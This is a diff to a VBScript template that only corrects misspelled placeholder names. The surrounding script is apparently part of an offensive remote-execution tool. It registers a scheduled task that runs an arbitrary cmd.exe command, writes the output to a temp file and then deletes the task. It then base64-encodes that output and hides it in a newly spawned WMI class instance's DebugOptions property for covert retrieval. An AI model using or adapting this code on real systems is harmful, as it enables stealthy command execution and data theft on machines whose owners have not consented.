@@ -1,5 +1,5 @@
-If FileExists("C:\Windows\Temp\REPLEACE_WITH_FILENAME") Then
-    inputFile = "C:\Windows\Temp\REPLEACE_WITH_FILENAME"
+If FileExists("C:\Windows\Temp\REPLACE_WITH_FILENAME") Then
+    inputFile = "C:\Windows\Temp\REPLACE_WITH_FILENAME"
     Set inStream = CreateObject("ADODB.Stream")
     inStream.Open
     inStream.type= 1 'TypeBinary
@@ -13,11 +13,11 @@ If FileExists("C:\Windows\Temp\REPLEACE_WITH_FILENAME") Then
     Base64Encode = oNode.text
     
     On Error Resume Next
-    Set objTestNewInst = GetObject("Winmgmts:root\Cimv2:REPLEACE_WITH_CLASSNAME.CreationClassName=""RELEACE_WITH_UUID""")
+    Set objTestNewInst = GetObject("Winmgmts:root\Cimv2:REPLACE_WITH_CLASSNAME.CreationClassName=""RELEACE_WITH_UUID""")
     If Err.Number <> 0 Then
         Err.Clear
         wbemCimtypeString = 8
-        Set objClass = GetObject("Winmgmts:root\cimv2:REPLEACE_WITH_CLASSNAME")
+        Set objClass = GetObject("Winmgmts:root\cimv2:REPLACE_WITH_CLASSNAME")
         Set objInstance = objClass.spawninstance_
         objInstance.CreationClassName = "RELEACE_WITH_UUID"
         objInstance.DebugOptions = Base64Encode
@@ -50,7 +50,7 @@ Else
     Dim Action
     Set Action = taskDefinition.Actions.Create(ActionTypeExec)
     Action.Path = "c:\windows\system32\cmd.exe"
-    Action.arguments = chr(34) & "/c REPLEACE_WITH_COMMAND > C:\Windows\Temp\REPLEACE_WITH_FILENAME" & chr(34)
+    Action.arguments = chr(34) & "/c REPLACE_WITH_COMMAND > C:\Windows\Temp\REPLACE_WITH_FILENAME" & chr(34)
     Dim objNet, LoginUser
     Set objNet = CreateObject("WScript.Network")
     LoginUser = objNet.UserName
@@ -58,8 +58,8 @@ Else
     Else
     LoginUser = Empty
     End If
-    Call rootFolder.RegisterTaskDefinition("REPLEACE_WITH_TASK", taskDefinition, 6, LoginUser, , 3)
-    Call rootFolder.DeleteTask("REPLEACE_WITH_TASK",0)
+    Call rootFolder.RegisterTaskDefinition("REPLACE_WITH_TASK", taskDefinition, 6, LoginUser, , 3)
+    Call rootFolder.DeleteTask("REPLACE_WITH_TASK",0)
 End If
 
 Function FileExists(FilePath)
